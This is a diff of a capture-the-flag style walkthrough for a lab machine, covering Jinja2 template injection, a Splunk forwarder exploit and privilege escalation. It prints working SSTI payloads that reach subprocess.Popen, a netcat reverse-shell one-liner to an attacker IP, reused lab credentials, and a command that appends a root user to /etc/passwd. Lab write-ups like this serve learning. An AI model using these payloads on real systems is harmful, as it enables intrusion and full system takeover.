@@ -109,23 +109,30 @@ https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
 
 There are multiple methods found to achieve the RCE easily, but we will do it manually.  
 Started climbing the tree, by entering the following commands into the template, and reading the results from /archive.  
-
-{{"".\_\_class\_\_}}  
+```
+{{"".__class__}}  
+```
 <p align="center">
 <img width="780" alt="13" src="https://user-images.githubusercontent.com/21021400/145070401-a0ef6be0-ff4b-4e43-8e77-a6b49f9d7b27.png">
 </p>
 
-{{"".\_\_class\_\_.\_\_mro\_\_}}  
+```
+{{"".__class__.__mro__}}  
+```
 <p align="center">
 <img width="850" alt="14" src="https://user-images.githubusercontent.com/21021400/145070403-18429496-2db8-4a4b-b963-1d4db3cb64bf.png">
 </p>
 
-{{"".\_\_class\_\_.\_\_mro\_\_[1]}}  
+```
+{{"".__class__.__mro__[1]}}  
+```
 <p align="center">
 <img width="792" alt="15" src="https://user-images.githubusercontent.com/21021400/145070404-c5cf216b-3009-4b20-b6ab-899dca191b72.png">
 </p>
 
-{{"".\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()}}  
+```
+{{"".__class__.__mro__[1].__subclasses__()}}  
+```
 <p align="center">
 <img width="960" alt="16" src="https://user-images.githubusercontent.com/21021400/145070408-0ce406cc-1e4b-4a44-8993-84e99a95fb37.png">
 </p>
@@ -144,31 +151,43 @@ As we can see its a long list with HTML entities:
 &#39; represents '  
 
 We will use sed to find and replaces all occurences of the HTML entities.
+```
 sed 's/&lt;/</g'  
+```
 replace all &lt; occurrences with <  
 
 replace all the "&gt;" occurrences with >  
+```
 sed 's/&gt;/>/g'  
-
+```
 replace all "&#39;" occurences with '  
+```
 sed "s/&#39;/'/g"  
-
+```
 replacing all the commas with new lines  
+```
 sed "s/, /\n/g"  
-
+```
 Combining the 4 together:  
+```
 cat results | sed 's/&gt;/>/g' | sed 's/&lt;/</g' | sed "s/&#39;/'/g" | sed "s/, /\n/g"  
-<p align="center">
+```
+ <p align="center">
 <img width="373" alt="18" src="https://user-images.githubusercontent.com/21021400/145070411-cf71df60-3479-4c38-98ed-bc62497531ab.png">
 </p>
 
 Now that we have a beautiful list, let's look for subprocess module.  
+```
 cat results | sed 's/&gt;/>/g' | sed 's/&lt;/</g' | sed "s/&#39;/'/g" | sed "s/, /\n/g" | grep subprocess  
+```
 <p align="center">
 <img width="444" alt="19" src="https://user-images.githubusercontent.com/21021400/145070413-39804b1c-aa60-4afd-af55-19d26aed70cd.png">
 </p>
 
-Now let's get the line number of subprocess.Popen using grep with -n tag.  
+Now let's get the line number of subprocess.Popen using grep with -n tag.
+```
+cat results | sed 's/&gt;/>/g' | sed 's/&lt;/</g' | sed "s/&#39;/'/g" | sed "s/, /\n/g" | grep subprocess -n  
+```
 <p align="center">
 <img width="481" alt="20" src="https://user-images.githubusercontent.com/21021400/145070414-696d4f87-a62b-44c7-bf44-8424cf60f390.png">
 </p>
@@ -177,13 +196,17 @@ subprocess.Popen is at line 408.
 However we need to substract 1 from the line number we got because the indexes do not align.  
 
 So the next command to inject into the template engine will be:  
-{{"".\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()[407]}}  
+```
+{{"".__class__.__mro__[1].__subclasses__()[407]}}  
+```
 <p align="center">
 <img width="809" alt="21" src="https://user-images.githubusercontent.com/21021400/145070415-ea694684-f824-4a87-be4b-d3cdce1c281c.png">
 </p>
 
 We will try to execute 'whoami' as a POC:  
-{{"".\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()[407]('whoami', shell=True, stdout=-1).communicate()}}  
+ ```
+{{"".__class__.__mro__[1].__subclasses__()[407]('whoami', shell=True, stdout=-1).communicate()}}  
+ ```
 <p align="center">
 <img width="765" alt="22" src="https://user-images.githubusercontent.com/21021400/145070416-2fa1c596-9ebf-4873-81aa-ca7db1deb2be.png">
 </p>
@@ -195,7 +218,9 @@ Tried a few syntaxes of nc reverse shell payloads but only this on worked:
 rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f  
 
 Opened netcat on port 1234 and injected the following command:  
-{{"".\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()[407]('rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f', shell=True, stdout=-1).communicate()}}  
+ ```
+{{"".__class__.__mro__[1].__subclasses__()[407]('rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f', shell=True, stdout=-1).communicate()}}  
+ ```
 <p align="center">
 <img width="244" alt="23" src="https://user-images.githubusercontent.com/21021400/145070417-70d1d27f-d427-4f97-8600-61d475f5f10f.png">
 </p>
@@ -217,8 +242,7 @@ Meaning, we can read log files that located in /var/log.
 <img width="358" alt="25" src="https://user-images.githubusercontent.com/21021400/145070422-fea9a608-f9a4-4856-8f38-717bec6b3d08.png">
 </p>
 
-After checking several log files, got a hit on a backup file located in /var/log/apache2:  
-using cat backup | grep pass  
+After checking several log files, got a hit on a backup file located in /var/log/apache2:    
 <p align="center">
 <img width="506" alt="26" src="https://user-images.githubusercontent.com/21021400/145070424-b4038db3-f93b-4f69-88a4-9a47684c3f37.png">
 </p>
@@ -253,14 +277,18 @@ Running the exploit indicates the parameters needed:
 </p>
 
 So the POC command will be:  
+```
 python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload 'whoami'  
+ ```
 <p align="center">
 <img width="549" alt="31" src="https://user-images.githubusercontent.com/21021400/145070440-23ae5d98-2c92-45ab-b420-7331090f7ecc.png">
 </p>
 
 However, we don't get results from the exploit even though it seems to work.  
 Let's try another way to get POC that the exploit works, by creating a file on the remote machine on /tmp directory:  
+ ```
 python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload 'touch /tmp/test'  
+ ```
 <p align="center">
 <img width="588" alt="32" src="https://user-images.githubusercontent.com/21021400/145070443-92433f3e-4814-42bc-a7a6-ae668156b2c0.png">
 </p>
@@ -274,16 +302,22 @@ We can see that the file was created by root.
  
 We will escalate the privileges by adding an entry to the /etc/passwd file.  
 On the local machine, create a password for the new user to be added:  
+ ```
 perl -le 'print crypt("pass", "anything")'  
+ ```
 <p align="center">
 <img width="184" alt="34" src="https://user-images.githubusercontent.com/21021400/145070446-bb62b007-e364-4e78-98d4-c32c20ece2e3.png">
 </p>
 
 The line that needs to be added to the passwd file is:  
+ ```
 root2:an5CaYOk82Zq6:0:0:root2:/root:/bin/bash  
+ ```
 
 So the final command is:  
+ ```
 python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload 'echo "root2:an5CaYOk82Zq6:0:0:root2:/root:/bin/bash" >> /etc/passwd'  
+ ```
 <p align="center">
 <img width="472" alt="35" src="https://user-images.githubusercontent.com/21021400/145070448-eebf4bef-cf8c-4bd8-8ba2-4b72537f158b.png">
 </p>
